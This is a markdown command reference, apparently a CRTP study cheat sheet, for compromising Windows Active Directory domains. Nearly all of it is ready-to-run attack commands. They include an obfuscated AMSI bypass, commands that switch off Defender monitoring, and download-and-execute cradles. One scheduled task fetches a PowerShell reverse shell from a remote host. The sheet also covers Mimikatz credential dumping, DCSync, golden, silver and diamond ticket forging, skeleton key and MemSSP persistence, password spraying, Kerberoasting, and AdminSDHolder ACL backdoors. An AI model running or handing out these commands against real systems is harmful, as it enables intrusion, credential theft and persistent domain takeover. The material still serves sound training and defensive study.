# Powershell and AD Commands
- [Powershell Basics](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powershell-basics)
- [Running Powershell - AMSI and EP Bypass](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#running-powershell)
- [Download Cradles](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#tool-download)
- [Active Directory Enumeration](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#active-directory-enumeration)
  - [Domain Info](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#domain-info)
  - [Machines](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#machines)
  - [Users](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#users)
  - [Groups](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#groups)
  - [Shares, OUs, GPO Mapping etc](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#shares-gpos-etc)
  - [Users and Groups on remote machines](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#users-and-groups-of-machines)
  - [User Hunting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#user-hunting)
- [ADSearch](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#ad-search)
- [BloodHound/SharpHound/RustHound](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#bloodhound)
- [Local PrivEsc](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#local-privilege-escalation)
- [Lateral Movement](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#lateral-movement)
    - [Powershell Remoting and Evil-WinRM](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powershell-remoting)
    - [PSExec and Impacket](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#psexec-and-impacket)
    - [OverPass-the-hash/Pass-the-key](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-overpass-the-hash)
- [Mimikatz and Ticket Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz)
  - [DCSync](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dcsync)
  - [Golden](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#golden)
  - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver)
  - [Invoke-Mimikatz.ps1](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#invoke-mimikatz)
  - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
- [Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)
  - [Brute](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#brute)
  - [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#roasting)
  - [List Tickets, hash, and tgtdeleg](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#list-tickets)
  - [Pass-the-key/Over-PTH - asktgt and asktgs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#pass-the-keyover-pth)
  - [Golden](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#golden-1)
  - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver-1)
  - [S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#s4u)
  - [Maintenance](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
  - [Troubleshooting errors](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#troubleshooting---errors)
- [ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
  - [Check ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
  - [PowerView get-DomainObjectACL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powerview-tips-on-domainobjectacl)
  - [Further ACL Enumeration](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#further-acl-enumeration)
  - [Persistence using ACLs - Rights Abuse (AdminSDHolder and Domain Replication Privs)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---rights-abuse)
  - [Persistence using ACLs - Security Descriptors (Remote WMI, PS Remoting, and Registry)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---security-descriptors)
- [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberoasting) 
  - [Privilege Escalation - Kerberoasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberoasting)
  - [Privilege Escalation - Targeted Kerberoasting - AS-REPs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#targeted-kerberoasting---as-reps)
  - [Privilege Escalation - Target a User via Kerberoasting - Set an SPN](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#privilege-escalation---target-a-user-via-kerberoasting-set-spn)
- [Kerberos Delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberos-delegation)
  - [Unconstrained delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#unconstrained-delegation)
    - [Printer Bug](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#printer-bug---why-wait-when-you-can-spool)
  - [Constrained delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#constrained-delegation)
    - [Rubeus S4U - Constrained Delegation User](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)
    - [Rubeus S4U - Constrained Delegation Machine](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-machine)
  - [Resource-Based Constrained Delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#resource-based-constrained-delegation)
- [noPac](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#nopac)
- [DNS Admins](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dns-admins)
- [Forest Trusts](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#forests-and-trusts)
  - [Within Forest - Child to Parent Domain/ForestRoot](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#child-to-parent---intra-forest-trust)
  - [Unconstrained Printer Forestry](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#unconstrained-printer-forestry)
  - [Across Forests - BiDirectional Trusts](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#across-forests---inter-forest-trust)
- [MS SQL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#ms-sql)
- [Forest Persistence - DC Shadow](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#forest-persistence---dcshadow)
- [Certificates](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#certificates)
- LAPS

# Powershell Basics

https://www.theochem.ru.nl/~pwormer/teachmat/PS_cheat_sheet.html

#### Help
```
Get-Help Get-Help
Get-Help *
Get-Help process
Get-Help Get-Item -Full
Get-Help Get-Item -Examples
```
#### Modules
```Import-Module modulepath```

```Get-Command -Module <modulename>```



#### Filter property string search

```Get-ADUser -Filter * | Where-Object {$_.Name -like '*smith*'}```
  
```Get-Service | Where-Object {$_.DisplayName -like '*Windows*'}```



```Get-Process | Select-Object -Property * | Where-Object { $_.psobject.Properties.Value -like '*chrome*' }```

```Get-Process | Select-Object -Property * | Where-Object { $_.* -like '*chrome*' }```

```Get-DomainUser  | Select-Object -Property * | Where-Object { $_.* -like '*admin*' }```

# Running Powershell
#### AMSI Bypass
https://amsi.fail/

Then obfuscate with -  https://github.com/danielbohannon/Invoke-Obfuscation
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```



#### EP Bypass
Start PowerShell from cmd.exe:

```Powershell -c <cmd>```

```powershell.exe -ep bypass```

OR If already running-

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```

```$Env:PSExecutionPolicyPreference = 'Bypass'```

OR just one file - 

```Get-Content .runme.ps1 | PowerShell.exe -noprofile -```

```TYPE .runme.ps1 | PowerShell.exe -noprofile -```

```Get-Content .runme.ps1 | Invoke-Expression```

```GC .runme.ps1 | iex```


#### MS Bypass
```Set-MpPreference -DisableIOAVProtection $true```

```Set-MpPreference -DisableRealtimeMonitoring $true```

#### Kerberos Tickets
```klist```
```klist sessions```

# Tool Download

#### Execution Cradle
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```

#### Download Files
```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```

# Active Directory Enumeration

```
$ADClass=[System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

[AD Enumeration Scripts](https://github.com/conma293/ActiveDirectory)
#### Powerview
```. .\PowerView.ps1```

```Get-Domain*``` - Powerview

Wiki - https://powersploit.readthedocs.io/en/latest/Recon/

Readme - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

#### AD Module
Import AD Module without RSAT:

```iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory```

```Get-AD*``` - RSAT AD Module

#### Domain info

```Get-Domain```

```Get-DomainController | select Forest, Name, OSVersion | fl```

```Get-ForestDomain```
```Get-ForestDomain | select Name, DomainControllers, Forest | fl```

```Get-DomainPolicyData```
```Get-DomainPolicyData | select -expand SystemAccess```

* * * 
#### Machines

```Get-DomainComputer```
```Get-DomainComputer –OperatingSystem "*Server 2016*" ```
```Get-DomainComputer -Ping```
```Get-DomainComputer -FullData```

```Get-DomainComputer | select logoncount, samaccountname, dnshostname, distinguishedname, serviceprincipalname```

```Get-ADComputer -Filter * | select Name```

```Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' - Properties OperatingSystem | select Name,OperatingSystem```

```Get-ADComputer -Filter * -Properties *```

```Get-ADComputer -Filter *  -Properties DNSHostName | %{Test- Connection -Count 1 -ComputerName $_.DNSHostName}```

#### Users 
```net user <user> /domain```

```Get-DomainUser```

```Get-DomainUser | select logoncount, displayname, samaccountname, memberof```

```Get-DomainUser –Identity bob```

```Get-DomainUser -Identity bob -Properties DisplayName, MemberOf | fl```

```Get-DomainUser -Identity bob |select -Expand MemberOf```

```Get-ADUser -Filter * -Properties *```
```Get-ADUser -Identity bob -Properties *```

#### Groups
```net localgroup administrators```

```whoami /groups```

```net group "domain admins" /domain```

```Get-DomainGroup -FullData```
```Get-DomainGroup "admin"```
```Get-DomainGroup –UserName "bob"```

```Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName```

#### Group Membership

```Get-DomainGroupMember -Identity "Domain Admin*" -Recurse```

```Get-DomainGroupMember -Identity "*Admin*" -Recurse | select GroupName, MemberName```

```Get-DomainGroupMember -Identity "Domain Admins" | select GroupName, MemberName, MemberDistinguishedName```

```Get-ADGroupMember -Identity "Domain Admins" -Recursive```


* * *

#### Shares, GPOs, etc


```Invoke-ShareFinder –Verbose``` - _Groups.xml_ in SYSVOL is always worth a look

```Invoke-FileFinder –Verbose```

```Get-NetFileServer```

```Get-DomainGPO```

```Get-DomainOU -Properties Name | sort -Property Name``` - useful to see groups of machines (that may have GPOs applied to them)

```Get-DomainGPOLocalGroup | select GPODisplayName, GroupName``` - shows all GPOs that alter localadmin - returns name of GPO and Group/User Name being affected

```Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl``` - returns all computers within OUs that have a domain group inherit localadmin privileges

* * *
#### Users and Groups of Machines
```Get-NetLocalGroup -ComputerName <hostname>``` List all the local groups on a machine (needs admin privs on non-
dc machines)

```Get-NetLocalGroupMember -ComputerName <hostname>``` Get members of all the local groups on a machine (needs admin privs on non-dc machines)


```Get-NetLoggedon –ComputerName <hostname>``` (needs localadmin)

```Get-LoggedonLocal -ComputerName <hostname>``` (needs localadmin)
#### User Hunting

```Find-LocalAdminAccess``` - find all machines on current domain where current user has localadmin access

```Find-LocalAdminAccess -CheckAccess``` - list sessions where you have access to the machine

```Invoke-UserHunter``` for users/groups you want - will show all active sessions for users/users of specified groups

```Invoke-UserHunter -GroupName "RDPUsers"```
* * * 
#### AD Search
https://github.com/tomcarver16/ADSearch

optional - ```--json```


```ADSearch.exe --search "objectCategory=user"```

```ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"```

```ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member```

* * *
#### Bloodhound

SharpHound Collectors - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/
```
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.lab -OutputDirectory C:\Temp -ZipFileName loot123.zip
```

#### RustHound 
Compile new for OpSec:  https://github.com/OPENCYBER-FR/RustHound


- Install Rust from source (and ```apt install cargo```)
```
sudo apt-get install cargo

python x.py build
python x.py dist
python x.py install
```

- Create Rusthound executable

```
git clone https://github.com/OPENCYBER-FR/RustHound.git

make install_windows_deps
make windows
```

* * * 
# Local Privilege Escalation

Run PowerUp - are you already localadmin?
```
. ./PowerUp.ps1
Invoke-AllChecks 
```


```Get-UnquotedService```

```Get-ModifiableService```

```Get-ModifiableServiceFile | select servicename, abusefeature```

# Lateral Movement
#### PowerShell Remoting
```Find-LocalAdminAccess -CheckAccess```

```Enter-PSSession –Computername Server1```

```$Sess = New-PSSession –Computername Server1```

```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```

```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```

If functions not on remote host:-

```. ./Invoke-Mimikatz.ps1```
```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```

##### Copy File Across
```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
``` ls //Server1.local/c$/temp```
* * *
#### Evil WinRM
Basically Powershell remoting possible from linux host:-

```evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23```
* * *

#### PSExec and Impacket

```PsExec.exe -accepteula \\$HOSTNAME cmd```

```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

* * *

#### Mimikatz OverPass-the-hash
```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```

#### Mimikatz Import Ticket
```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```

#### Rubeus OverPass/Pass-the-key
```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```

```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```

```Rubeus.exe asktgt /user:webadmin /password:Password01 /ptt```

- [Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)
* * *

# Mimikatz 
[Basic Mimikatz Commands - OSCP AD Cheatsheet](https://github.com/conma293/OSCP-tools/blob/master/cheatsheets/BasicAD.md#mimikatz)

https://adsecurity.org/?page_id=1821

NTLM == RC4



#### DCSync
Does NOT need localadmin to run, just DC Replication privs:
```
lsadump::dcsync /user:Administrator
```

dump krbtgt - 
```
lsadump::dcsync /user:ecorp\krbtgt
```
#### Golden
Jump to DC to dump krbtgt hash or via DCSync above -

```psexec.exe \\dc01 cmd.exe```

```Privilege::debug```

```lsadump::lsa /patch```

**Note:** The top "Administrator" account dumped by Mimikatz with this command is actually the DSRM of the DC

Now back on attacker machine you use the NTLM of krbtgt account to create Golden Tickets:-

```
kerberos::golden 
/user:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

#### Silver
SPNs - https://adsecurity.org/?page_id=183
```
kerberos::golden 
/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /target:dc01.ecorp.local /service:HOST 
/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt
```
#### Scheduled Task Creation via TGS
With HOST Service access you can now create a scheduled task on the target machine:-

```
schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
```

```
schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/conma293/mvp/main/Invoke-PowerShellTcp.ps1'')'"
```

```
schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
```
Note: Similar to PTH for applicable kerberos systems 

# Invoke Mimikatz

#### Patch script if VirtualAlloc Error
```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/conma293/mvp/main/Invoke-Mimikatz_MOD.ps1")
```

Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 



https://github.com/mitre/caldera/issues/38#issuecomment-396055260

https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/

* * *


```. ./Invoke-Mimikatz.ps1```

```Invoke-Mimikatz -ComputerName DC01```

```Invoke-Mimikatz -ComputerName DC01 -DumpCreds```

Dump everything in a pinch:

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
* * *

When invoking command make sure to wrap in double AND single quotes - 

```Invoke-Mimikatz -ComputerName DC01 -Command "kerberos::list"```

```Invoke-Mimikatz -ComputerName DC01 -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"'```

```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```

``` 
Invoke-Mimikatz -Command '"kerberos::golden 
/user:MickeyMouse /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
# Mimikatz - Misc Attacks

#### Skeleton Key Attack:-

```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```

May require Kernel Driverload onto the host if process protected:-

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```
 #### MemSSP
 MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
 
```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log


* * *
# Rubeus
https://github.com/GhostPack/Rubeus

https://www.hackingarticles.in/a-detailed-guide-on-rubeus/


#### Brute
Brute Password spray:

```Rubeus.exe brute /password:Password01 /noticket```

* * * 

#### Roasting
```Rubeus.exe kerberoast /nowrap```
- [Full kerberoast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-1)

```Rubeus.exe asreproast /nowrap```
- [Full aseproast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#get-as-reps)

* * *

#### List tickets
https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting

Get tickets currently on System:
- List all kerberos tickets from current logon sessions - ```Rubeus.exe triage```
- Steal TGT from a specific Logon Session - ```Rubeus.exe dump /luid:0x6042e /service:krbtgt```


Harvest tickets currently on System (Warning - this will lose an implant as its interactive!):
- All - ```Rubeus.exe monitor /interval:30 /runfor:300 /nowrap``` 
- Specific User on Machine - ```rubeus.exe harvest /targetuser:Mary /interval:10 /runfor:100 /nowrap```
  - (```harvest```=```monitor``` + autorenewal for tickets)

#### Tgtdeleg
Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```

"_retrieve a usable TGT for the current user without needing elevation on the host_" -https://github.com/GhostPack/Rubeus#tgtdeleg


#### Hash
Hash of a user:
```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```

* * *

#### Pass-the-key/Over-PTH
https://specterops.gitbook.io/ghostpack/rubeus/ticket-requests-and-renewals

Request ticket (TGT) based on username and password/hash:
```
Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
```
- [from latmove opth previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)

Request Service ticket (TGS) based on Service Name:
```
Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
```

* * *

#### Golden:

```/rc4:``` or ```/aes256:``` etc as krbtgt hash

optional:
- ```/ldap``` - fetch details for user identity you are forging to better impersonate
- ```/printcmd``` - oneliner based on those full details to forge same ticket later
- ```/domain``` - specify domain
- ```/ptt``` - inject ticket

```
rubeus.exe golden /user:DAdmin123 /rc4:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /printcmd
```

#### Diamond:
```/krbkey:``` krbtgt hash (must be the same hash type as being passed for the user!)

```/ticketuserid``` - RID of User to be impersonated (likely -500 for builtin or -1104 for DA User)

```/groups``` - Group RID to be impersonated (likely 512)

optional:
- ```/tgtdeleg``` - use current user session for identity (self request TGT)
- ```/user:``` - The known user to steal the TGT of
- ```/rc4:``` or ```/aes256:``` is the known user hash (from which we steal TGT info for forgery)
- ```/password:``` - cleartext password of known user
- ```/enctype:``` - Encryption type to use if using password (Match with krbkey type!)
- ```/certificate:``` - use certificate for identity
- ```/domain:``` - specify domain
- ```/dc:``` - DC
- ```/ptt``` - inject ticket

```
rubeus.exe diamond /tgtdeleg /ticketuser:DAdmin /ticketuserid:500 /groups:512 /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C 
```


* * * 

#### Silver:
```/rc4:``` or ```/aes256:``` etc as service hash

```
rubeus.exe silver /user:Bob /ldap /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03
```

optional:
- ```/ldap``` - fetch details for user identity you are forging to better impersonate
- ```/creduser``` - using LDAP with alternate credentials to get the PAC information
- ```/credpassword``` -
- ```/krbkey``` - create the KDCChecksum and TicketChecksum if it is a referral ticket
- ```/krbenctype``` - 
- ```/domain``` - specify domain
- ```/ptt``` - inject ticket

```
rubeus.exe silver /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
```



#### S4U
https://specterops.gitbook.io/ghostpack/rubeus/constrained-delegation-abuse

Kerberos Delegation and S4U:
- [Unconstrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-unconstrained-delegation-attack-flow-with-spoolsample)
- [Constrained S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-s4u---constrained-delegation-user)

* * *

#### Maintenance
https://specterops.gitbook.io/ghostpack/rubeus/ticket-management

Purge all kerberos tickets: ```rubeus.exe purge```

View ticket: 
```rubeus.exe describe``` ```/ticket:doIFNDCCBTCg...bA==``` OR ```/ticket:stolen_users_club.kirbi```

We can purge by LUID also:
```rubeus.exe purge /luid:0x8f57c```



#### Troubleshooting - errors

```[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED``` - You are putting in the hash wrong!

```[X] Error 1326 running LsaLookupAuthenticationPackage (ProtocolStatus): The user name or password is incorrect``` - you are putting in the ticket wrong (Probs didnt copy paste it properly)

* * *

# Check ACLs
```Find-InterestingDomainAcl -ResolveGUIDs```

Check Domain Admins permissions for a specific user:

```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.IdentityReference -match 'Mary' }```

```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Mary' }```

**Note:**  ```Where-Object```  ==  ``` ? ```

Does user 'Mary' have access rights to perform DCSync: 

```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? { ($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')) }```

# PowerView tips on DomainObjectACL:
#### retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }```

#### enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
```Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local```

#### grant user 'will' the rights to change 'matt's password
```Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose```

#### audit the permissions of AdminSDHolder, resolving GUIDs
```Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs```

#### backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
```Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All```
* * *
#### Recurse through all ACEs for user/group:

This appends the resolved user or group name to each ACE and recurses through:
```
Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ }
```

# Further ACL Enumeration

#### Rights we care about:
- GenericAll 
- ForceChangePassword
- AllExtendedRights
- WriteDACL

[more](https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md)

#### ACL Enumeration for a specific object
Enumerate all ACLs for specific Identity/object:
```
Get-ObjectAcl -Identity <User123> -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ }
```

#### ACLs for current user:
```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ } | Foreach-Object { if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_} }
```

GenericAll access rights to an object such as a user, means we can do just about anything including change the password:

```net user Bob Password01 /domain```

#### ACLs for current group:
```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ } | Foreach-Object { if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_} }
```

likewise, if we have GenericAll access rights a group object, we can simply add ourselves to that group:

```net group webadmins Bob /add /domain```

#### WriteDACL

ACL properties for specific object:

```
AceType : AccessAllowed
ObjectDN : CN=Victor,OU=dbusers,DC=ecorp,DC=lab
ActiveDirectoryRights : ReadProperty, ..., WriteDacl
...
Identity : ECORP\Bob
```

If we identify through the above enumeration techniques that we have ```WriteDacl``` permissions to an object, such as to the 'Victor' user object shown above, we can modify the ActiveDirectory rights to ```GenericAll``` in order to be able to change ther user account password and take control of the account like we did with Bob:

```Add-DomainObjectAcl -TargetIdentity Victor -PrincipalIdentity Bob -Rights All```


Verify it worked:

```
Get-ObjectAcl -Identity <Victor> -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ } | Foreach-Object { if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_} }
```

```
AceType : AccessAllowed
ObjectDN : CN=Victor,OU=dbusers,DC=ecorp,DC=lab
ActiveDirectoryRights : GenericAll
...
Identity : ECORP\Bob
```

Now we have GenericAll we can change the password of Victor like before:
```net user Victor Password01 /domain```

* * * 

# Persistence Using ACLs - Rights Abuse
#### AdminSDHolder 

Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 

```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module

